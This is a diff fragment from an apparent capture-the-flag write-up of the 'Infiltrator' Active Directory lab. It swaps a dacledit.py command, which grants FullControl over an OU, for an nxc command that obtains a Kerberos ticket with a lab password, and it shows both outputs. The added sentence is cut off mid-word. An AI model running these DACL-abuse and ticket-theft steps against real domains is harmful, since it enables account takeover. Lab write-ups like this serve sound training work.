@@ -337,18 +337,14 @@ This OU contains the `e.rodriguez` user, this means i can apply an inheritance r
 # Compromising `e.rodriguez`
 
 ```python
-dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb'/'d.anderson':'WAT?watismypass!' -k
-Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
-
-[-] CCache file is not found. Skipping...
-[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
-/home/kali/.local/bin/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
-  with codecs.open(self.filename, 'w', 'utf-8') as outfile:
-[*] DACL backed up to dacledit-20261004-180336.bak
-[*] DACL modified successfully!
+nxc smb dc01.infiltrator.htb -u d.anderson -p 'WAT?watismypass!' -k --generate-tgt d.anderson
+SMB         dc01.infiltrator.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\d.anderson:WAT?watismypass! 
+SMB         dc01.infiltrator.htb 445    DC01             [+] TGT saved to: d.anderson.ccache
+SMB         dc01.infiltrator.htb 445    DC01             [+] Run the following command to use the TGT: export KRB5CCNAME=d.anderson.ccache
 ```
 
-Ill apply the rule to the OU
+First ill get a TGT f
 
 ```python
 
